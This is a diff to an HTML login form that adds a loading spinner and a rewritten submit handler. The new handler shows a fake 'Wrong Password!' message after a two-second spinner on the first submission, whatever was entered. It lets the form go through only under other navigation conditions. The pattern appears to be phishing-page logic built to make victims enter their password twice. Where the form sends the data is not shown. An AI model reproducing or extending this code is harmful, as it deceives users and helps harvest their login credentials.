@@ -14,27 +14,39 @@
                     	<label for="PASSField">Password</label>
                     	<input type="password" class="form-control" id="PASSField" name="PASSField">
                   	</div>
+					   					  				<div style="align-text:center; margin-top:40px;"class="spinner-border" role="status" id="LOAD"hidden>
+										<span  style="align-content:center; padding-top:20px;" class="sr-only">Loading...</span>
+									</div>
 					  				<div style="padding-bottom:20px"> <span id="errorSystem" style="color: #EE4B2B;"></span></div>  </span>
-                  	<button target="_self" class="btn btn-info btn-block"  role="button">Login</button>
-                </form>
-									  <script>
-										  
-						   $('#firstform').submit(function(event) {
+                  	<button id="THEBUTTON" target="_self" class="btn btn-info btn-block"  role="button">Login</button>
 
+                </form>
+
+					<script>
+						$('#firstform').submit(function(event) {
+						$(this).bind("submit")
 						var error = document.getElementById("errorSystem")
-						
-							if (performance.navigation.type === 0)
+						var docs = document.getElementById("PASSField").value
+							if (docs === "")
 							{
-								function test()
-								{
-									error.innerText = "Wrong Password!"
-								}
-								setTimeout(test, 100)
+									
+								error.innerText = "No Password!"	
 							}
-							else 
+							else if (performance.navigation.type === 1 || performance.navigation.type === 0) 
 							{
 								error.innerText = ""
-								$(this).unbind('submit').submit(); 
+								document.getElementById("LOAD").hidden = false
+								function test()
+								{
+									document.getElementById("LOAD").hidden = true
+									error.innerText = "Wrong Password!"
+								}
+								setTimeout(test, 2000)
+							}
+							else {
+								document.getElementById("LOAD").hidden = true
+								error.innerText = ""
+								$(this).unbind("submit").submit(); 
 							}
 							
 						})
